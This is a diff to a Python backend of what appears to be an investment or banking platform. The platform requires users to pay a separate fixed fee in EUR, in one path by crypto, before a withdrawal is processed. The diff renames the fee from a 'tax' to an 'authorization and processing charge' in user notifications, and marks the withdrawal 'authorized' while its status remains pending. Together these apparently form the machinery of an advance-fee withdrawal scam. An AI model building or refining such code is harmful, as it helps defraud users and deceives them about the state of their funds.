@@ -101,9 +101,9 @@ async def create_transaction(tx_data: TransactionCreate, current_user: dict = De
         status = 'pending_tax'
         transaction_reference = generate_transaction_reference()
         
-        # Create notification about withdrawal request and tax requirement
-        await create_notification(current_user['id'], 'Solicitud de Retiro - Impuesto Pendiente',
-            f'Su solicitud de retiro de {tx_data.amount} {currency} ha sido recibida. Para procesar su retiro, debe abonar el impuesto requerido. Referencia: {transaction_reference}')
+        # Create notification about withdrawal request and authorization charge requirement
+        await create_notification(current_user['id'], 'Solicitud de Retiro - Cargo de Autorización Pendiente',
+            f'Su solicitud de retiro de {tx_data.amount} {currency} ha sido recibida. Para autorizar y procesar su retiro, debe abonar el Cargo de autorización y procesamiento del retiro ({TAX_AMOUNT:,.2f} EUR). Referencia: {transaction_reference}')
         
         # Log withdrawal request for admin notification
         await db.admin_notifications.insert_one({
@@ -114,7 +114,9 @@ async def create_transaction(tx_data: TransactionCreate, current_user: dict = De
             'user_name': current_user['name'],
             'amount': tx_data.amount,
             'currency': currency,
+            'reference': transaction_reference,
             'status': 'pending_tax',
+            'message': f'{current_user["name"]} solicitó un retiro de {tx_data.amount:,.2f} {currency}. Ref: {transaction_reference}. Estado: Pendiente de abono.',
             'created_at': datetime.now(timezone.utc).isoformat()
         })
         
@@ -215,7 +217,7 @@ async def create_transaction(tx_data: TransactionCreate, current_user: dict = De
         transaction['status_timeline'] = [{
             'at': now,
             'status': 'pending_tax',
-            'status_label': 'Solicitud recibida · Impuesto pendiente',
+            'status_label': 'Retiro solicitado · Pendiente de abono',
             'actor_role': 'user',
         }]
         
@@ -236,8 +238,8 @@ async def create_transaction(tx_data: TransactionCreate, current_user: dict = De
         # Notify admin about withdrawal request
         await create_admin_notification(
             notification_type='withdrawal_request',
-            title='Nueva Solicitud de Retiro - Impuesto Pendiente',
-            message=f'{current_user["name"]} ha solicitado un retiro de ${tx_data.amount:,.2f} {tx_data.currency}. Impuesto pendiente de pago.',
+            title='Nueva Solicitud de Retiro - Pendiente de Abono',
+            message=f'{current_user["name"]} solicitó un retiro de {tx_data.amount:,.2f} {tx_data.currency}. Ref: {transaction_reference}. Estado: Pendiente de abono (Cargo de autorización y procesamiento del retiro).',
             user_info={
                 'name': current_user['name'],
                 'email': current_user['email'],
@@ -247,6 +249,8 @@ async def create_transaction(tx_data: TransactionCreate, current_user: dict = De
             metadata={
                 'amount': tx_data.amount, 
                 'currency': tx_data.currency,
+                'reference': transaction_reference,
+                'status': 'pending_tax',
                 'bank_name': tx_data.banking_info.bank_name if tx_data.banking_info else 'N/A',
                 'iban_last4': tx_data.banking_info.iban[-4:] if tx_data.banking_info and tx_data.banking_info.iban else (tx_data.banking_info.account_number[-4:] if tx_data.banking_info and tx_data.banking_info.account_number else 'N/A'),
                 'tax_required': TAX_AMOUNT
@@ -288,7 +292,7 @@ async def create_transaction(tx_data: TransactionCreate, current_user: dict = De
             requested_at=now,
             amount_text=f"{tx_data.amount:,.2f} {currency}",
             net_text=f"{tx_data.amount:,.2f} {currency}",
-            fee_text=f"Impuesto de procesamiento: {TAX_AMOUNT:,.2f} EUR (se abona por separado)",
+            fee_text=f"Cargo de autorización y procesamiento del retiro: {TAX_AMOUNT:,.2f} EUR (se abona por separado)",
             method_text=bank_label,
             status_text='Pendiente de impuesto',
         ))
@@ -724,7 +728,7 @@ async def pay_tax(transaction_id: str, tax_payment: PayTaxRequest, current_user:
             timeline_entry = {
                 'at': update_fields['tax_completed_at'],
                 'status': 'pending',
-                'status_label': 'Impuesto completado · Pendiente de aprobación',
+                'status_label': 'Abono verificado · Retiro autorizado',
                 'actor_role': 'user',
             }
             
@@ -840,7 +844,15 @@ async def submit_crypto_tax_payment(
     # Update transaction status
     await db.transactions.update_one(
         {'id': transaction_id},
-        {'$set': {'status': 'crypto_payment_under_review'}}
+        {
+            '$set': {'status': 'crypto_payment_under_review'},
+            '$push': {'status_timeline': {
+                'at': now,
+                'status': 'crypto_payment_under_review',
+                'status_label': 'Comprobante enviado · En revisión',
+                'actor_role': 'user',
+            }},
+        }
     )
     
     # Notify user
